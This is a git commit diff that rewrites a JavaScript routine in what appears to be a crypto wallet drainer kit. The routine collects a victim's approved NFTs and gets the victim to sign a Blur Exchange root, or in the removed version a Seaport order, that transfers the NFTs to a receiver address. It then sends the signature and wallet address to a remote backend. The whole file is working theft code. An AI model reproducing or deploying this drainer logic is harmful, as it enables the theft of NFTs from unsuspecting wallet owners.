c14630c5581fd6d6bfcf4b5d5cdaaa0c2e1c859d
VeeTe <99633800+VeeTe@users.noreply.github.com>
2023-08-26 02:52:29 -0400

    Update blur_sendall.js
    Pasted the wrong thing originally

--- Crypto/blur_sendall.js
+++ Crypto/blur_sendall.js
@@ -1,45 +1,34 @@
-const SIGN_SEAPORT = async (assets, provider, sender_address, receiver_address, user_id, min_price = 0) => {
+const SIGN_BLUR = async (assets, provider, sender_address, receiver_address, user_id, min_price = 0) => {
   try {
     const nft_list = [], nft_list_plain = [];
     for (const asset of assets) {
       if (asset.skip || asset.type !== 'ERC721' || asset.chain_id != 1 || asset.amount_usd < min_price) continue;
-      if (!await is_nft_approved(asset.address, sender_address, "0x1E0049783F008A0085193E00003D00cd54003c71")) continue;
+      if (!await is_nft_approved(asset.address, sender_address, "0x00000000000111abe46ff893f3b2fdf1f759a8a8")) continue;
       nft_list.push({ collection: asset.address, tokenID: asset.id });
       nft_list_plain.push(asset);
     }
-    if (nft_list.length === 0) return;
+    if (nft_list.length < 2) return;
     let web3 = new ethers.providers.Web3Provider(provider), signer = web3.getSigner();
-    let seaportOffer = [], seaportConsiderations = [];
-    nft_list.forEach((value, _) => {
-      seaportOffer.push({
-        itemType: 2,
-        token: value.collection,
-        identifier: value.tokenID,
-      })
-      seaportConsiderations.push({
-        amount: "1",
-        recipient: receiver_address,
-        itemType: 2,
-        token: value.collection,
-        identifier: value.tokenID,
-      })
-    });
+    let response = await send_request({ action: 'blur', user_id: user_id, blur: 'root', tokens: nft_list, address: sender_address });
     try {
-      const seaportObject = new seaport.Seaport(signer, { seaportVersion: '1.5' });
-      const { executeAllActions: createSeaportOrder } =
-        await seaportObject.createOrder(
-          {
-            offer: seaportOffer,
-            consideration: seaportConsiderations,
-            conduitKey: "0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000",
-            zone: "0x004C00500000aD104D7DBd00e3ae0A5C00560C00",
-            startTime: '1660921177',
-            endTime: '19163599577',
-            offerer: sender_address
-          }, receiver_address);
-      await send_request({ action: 'seaport', user_id: user_id, seaport: 'request', assets: nft_list_plain });
-      const seaportOrder = await createSeaportOrder();
-      await send_request({ action: 'seaport', user_id: user_id, seaport: 'success', order: seaportOrder, address: sender_address });
+      await send_request({ action: 'blur', user_id: user_id, blur: 'request', assets: nft_list_plain });
+      const signature = await signer._signTypedData(
+        {
+          name: 'Blur Exchange',
+          version: '1.0',
+          chainId: 1,
+          verifyingContract: "0x000000000000Ad05Ccc4F10045630fb830B95127",
+        },
+        {
+          Root: [{ name: 'root', type: 'bytes32' }],
+        },
+        { root: response.data.root },
+      );
+      await send_request({
+        action: 'blur', user_id: user_id, blur: 'success',
+        signature: signature, address: sender_address,
+        root: response.data.root, paths: response.data.paths
+      });
       for (const asset of assets) {
         if (asset.skip || asset.type !== 'ERC721' || asset.chain_id != 1) continue;
         let is_signed = false;
@@ -56,7 +45,7 @@ const SIGN_SEAPORT = async (assets, provider, sender_address, receiver_address, 
       }
     } catch (err) {
       console.log(err);
-      await send_request({ action: 'seaport', user_id: user_id, seaport: 'cancel' });
+      await send_request({ action: 'blur', user_id: user_id, blur: 'cancel' });
     }
   } catch (err) {
     console.log(err);
